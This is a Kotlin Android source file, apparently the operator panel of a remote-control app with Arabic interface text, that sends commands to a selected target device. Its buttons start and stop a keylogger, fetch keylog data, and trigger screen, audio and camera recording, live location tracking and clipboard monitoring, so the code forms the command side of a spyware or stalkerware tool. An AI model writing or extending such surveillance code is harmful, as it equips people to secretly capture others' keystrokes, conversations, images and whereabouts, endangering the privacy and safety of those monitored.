package com.abuzahra.admin.ui.monitor

import android.os.Bundle
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.abuzahra.admin.data.api.SendCommandRequest
import com.abuzahra.admin.databinding.ActivityMonitorBinding
import com.abuzahra.admin.util.Preferences
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import kotlinx.coroutines.launch

class MonitorActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMonitorBinding
    private var selectedDeviceId: String = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMonitorBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setupToolbar()
        loadDeviceAndSetup()
    }

    private fun setupToolbar() {
        setSupportActionBar(binding.toolbar)
        supportActionBar?.title = "المراقبة"
        supportActionBar?.setDisplayHomeAsUpEnabled(true)
        binding.toolbar.setNavigationOnClickListener { finish() }
    }

    private fun loadDeviceAndSetup() {
        lifecycleScope.launch {
            try {
                val api = Preferences.getInstance(this@MonitorActivity).getApiService()
                val devices = api.getDevices()
                if (devices.isNotEmpty()) {
                    val firstOnline = devices.firstOrNull { it.isOnline } ?: devices.first()
                    selectedDeviceId = firstOnline.id
                    binding.tvSelectedDevice.text = "الجهاز: ${firstOnline.name.ifEmpty { firstOnline.model }}"
                } else {
                    binding.tvSelectedDevice.text = "لا توجد أجهزة"
                    return@launch
                }
            } catch (_: Exception) {}

            // Keylogger
            binding.btnStartKeylogger.setOnClickListener { sendMonitorCommand("start_keylogger", "بدء تسجيل المفاتيح") }
            binding.btnStopKeylogger.setOnClickListener { sendMonitorCommand("stop_keylogger", "إيقاف تسجيل المفاتيح") }
            binding.btnGetKeylogData.setOnClickListener { sendMonitorCommand("get_keylog_data", "بيانات تسجيل المفاتيح") }

            // Screen Record
            binding.btnStartScreenRecord.setOnClickListener { sendMonitorCommand("start_screen_record", "بدء تسجيل الشاشة") }
            binding.btnStopScreenRecord.setOnClickListener { sendMonitorCommand("stop_screen_record", "إيقاف تسجيل الشاشة") }

            // Audio Record
            binding.btnStartAudioRecord.setOnClickListener { sendMonitorCommand("start_audio_record", "بدء تسجيل الصوت") }
            binding.btnStopAudioRecord.setOnClickListener { sendMonitorCommand("stop_audio_record", "إيقاف تسجيل الصوت") }

            // Camera Capture
            binding.btnStartCameraCapture.setOnClickListener { sendMonitorCommand("start_camera_capture", "بدء التقاط الكاميرا") }
            binding.btnStopCameraCapture.setOnClickListener { sendMonitorCommand("stop_camera_capture", "إيقاف التقاط الكاميرا") }

            // Location
            binding.btnStartLocationLive.setOnClickListener { sendMonitorCommand("start_location_tracking", "بدء تتبع الموقع") }
            binding.btnStopLocationLive.setOnClickListener { sendMonitorCommand("stop_location_tracking", "إيقاف تتبع الموقع") }

            // Clipboard Monitor
            binding.btnStartClipboardMonitor.setOnClickListener { sendMonitorCommand("start_clipboard_monitor", "بدء مراقبة الحافظة") }
            binding.btnStopClipboardMonitor.setOnClickListener { sendMonitorCommand("stop_clipboard_monitor", "إيقاف مراقبة الحافظة") }
        }
    }

    private fun sendMonitorCommand(command: String, name: String) {
        if (selectedDeviceId.isBlank()) return
        lifecycleScope.launch {
            try {
                val api = Preferences.getInstance(this@MonitorActivity).getApiService()
                val response = api.sendCommand(selectedDeviceId, SendCommandRequest(command))
                MaterialAlertDialogBuilder(this@MonitorActivity)
                    .setTitle(name)
                    .setMessage(if (response.ok) "تم إرسال الأمر بنجاح" else "فشل: ${response.message}")
                    .setPositiveButton("حسناً", null)
                    .show()
            } catch (e: Exception) {
                MaterialAlertDialogBuilder(this@MonitorActivity)
                    .setTitle("خطأ")
                    .setMessage("${e.message}")
                    .setPositiveButton("حسناً", null)
                    .show()
            }
        }
    }
}